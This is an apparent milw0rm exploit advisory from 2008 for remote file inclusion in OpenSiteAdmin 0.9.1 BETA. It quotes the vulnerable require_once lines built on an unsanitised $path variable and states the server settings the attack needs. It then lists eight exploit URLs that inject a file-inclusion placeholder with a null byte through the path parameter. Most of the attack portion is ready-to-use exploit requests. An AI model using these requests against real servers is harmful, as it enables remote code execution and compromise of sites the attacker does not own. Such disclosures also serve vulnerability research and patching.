@@ -1,0 +1,62 @@
+Software Vulnerable:
+
+OpenSiteAdmin 0.9.1 BETA and maybe prior versions.
+
+Vulnerable Code:
+
+-OpenSiteAdmin/indexFooter.php
+require_once($path."footer.php");
+
+-OpenSiteAdmin/scripts/classes/DatabaseManager.php
+require_once($path."OpenSiteAdmin/include.php");
+require_once($path."OpenSiteAdmin/scripts/classes/ErrorLogManager.php");
+
+-OpenSiteAdmin/scripts/classes/FieldManager.php
+require_once($path."OpenSiteAdmin/scripts/classes/Fields/Checkbox.php");
+require_once($path."OpenSiteAdmin/scripts/classes/Fields/ForeignKey.php");
+.....
+..
+
+-OpenSiteAdmin/scripts/classes/Filter.php
+require_once($path."OpenSiteAdmin/scripts/classes/Filters/SingleFilter.php");
+
+-OpenSiteAdmin/scripts/classes/Form.php
+require_once($path."/OpenSiteAdmin/scripts/classes/Forms/Form_List.php");
+require_once($path."/OpenSiteAdmin/scripts/classes/Forms/Form_Single.php");
+
+-OpenSiteAdmin/scripts/classes/FormManager.php
+require_once($path."OpenSiteAdmin/scripts/classes/Form.php");
+
+-OpenSiteAdmin/scripts/classes/LoginManager.php
+require_once($path."OpenSiteAdmin/scripts/classes/SecurityManager.php");
+
+-OpenSiteAdmin/scripts/classes/Filters/SingleFilter.php
+require_once($path."OpenSiteAdmin/scripts/classes/RowManager.php");
+
+Download:
+http://sourceforge.net/project/showfiles.php?group_id=213524
+
+Server should have:
+    Register Globals: On
+    Magic_quotes_gpc: Off
+
+Exploit:
+
+http://www.vulnerable.com/OpenSiteAdmin/indexFooter.php?path=<File Inclusion>%00
+http://www.vulnerable.com/OpenSiteAdmin/scripts/classes/DatabaseManager.php?path=<File Inclusion>%00
+http://www.vulnerable.com/OpenSiteAdmin/scripts/classes/FieldManager.php?path=<File Inclusion>%00
+http://www.vulnerable.com/OpenSiteAdmin/scripts/classes/Filter.php?path=<File Inclusion>%00
+http://www.vulnerable.com/OpenSiteAdmin/scripts/classes/Form.php?path=<File Inclusion>%00
+http://www.vulnerable.com/OpenSiteAdmin/scripts/classes/FormManager.php?path=<File Inclusion>%00
+http://www.vulnerable.com/OpenSiteAdmin/scripts/classes/LoginManager.php?path=<File Inclusion>%00
+http://www.vulnerable.com/OpenSiteAdmin/scripts/classes/Filters/SingleFilter.php?path=<File Inclusion>%00
+
+Greetz:
+
+Members of http://www.p1mp4m.es and http://www.yashira.org
+
+Author:
+
+Trancek
+
+# milw0rm.com [2008-02-06]
